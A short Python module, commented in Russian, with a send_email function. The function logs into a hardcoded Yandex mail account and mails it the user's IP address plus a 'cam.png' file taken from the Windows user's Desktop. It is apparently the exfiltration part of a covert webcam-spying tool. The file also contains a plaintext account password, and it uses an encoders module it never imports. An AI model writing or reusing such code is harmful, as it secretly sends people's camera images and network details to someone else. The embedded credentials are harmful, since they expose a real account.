import smtplib                                            # requests, smtplib, cv2 
import mimetypes
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase                      # Общий тип
from email.mime.text import MIMEText                      # Текст/HTML
from email.mime.image import MIMEImage                    # Изображения
from email.mime.audio import MIMEAudio                    # Аудио
import requests

ip_address = "Unknown"

class Message():

	def send_email(Title="Title", Text='This is test message'):
		login = 'Maxkhrab@yandex.ru'
		password = 'maxim1200'
		url = 'smtp.yandex.ru'
		toaddr = 'Maxkhrab@yandex.ru'

		msg = MIMEMultipart()
		msg['Subject'] = Title
		msg['From'] = 'Maxkhrab@yandex.ru'
		body = Text + "\nip пользователя: " + ip_address


		msg.attach(MIMEText(body, 'plain'))

		filepath=f'C:\\Users\\{os.getlogin()}\\Desktop\\cam.png'                   # Имя файла в абсолютном или относительном формате
		filename = os.path.basename(filepath) 


		if os.path.isfile(filepath):                              # Если файл существует
  			ctype, encoding = mimetypes.guess_type(filepath)
  			if ctype is None or encoding is not None:
  				ctype = 'application/octet-stream'
  			maintype, subtype = ctype.split('/', 1)
  			if maintype == 'text':
  				with open(filepath) as fp:
  					file = MIMEText(fp.read(), _subtype=subtype) 
  					fp.close()
  			elif maintype == 'image':
  				with open(filepath, 'rb') as fp:
  					 file = MIMEImage(fp.read(), _subtype=subtype)
  					 fp.close()
  			elif maintype == 'audio':
  				with open(filepath, 'rb') as fp:
  					file = MIMEAudio(fp.read(), _subtype=subtype)
  					fp.close()
  			else:
  				with open(filepath, 'rb') as fp:
  					file = MIMEBase(maintype, subtype)
  					file.set_payload(fp.read())
  					fp.close()
  				encoders.encode_base64(file)
  			file.add_header('Content-Disposition', 'attachment', filename=filename)
  			msg.attach(file)

        
		server = smtplib.SMTP_SSL(url, 465)
		server.login(login, password)
		server.sendmail(login, toaddr, msg.as_string())
		server.quit()

if __name__ == '__main__':
  print('Вы запустили это как основную программу, а это модуль!')
  input()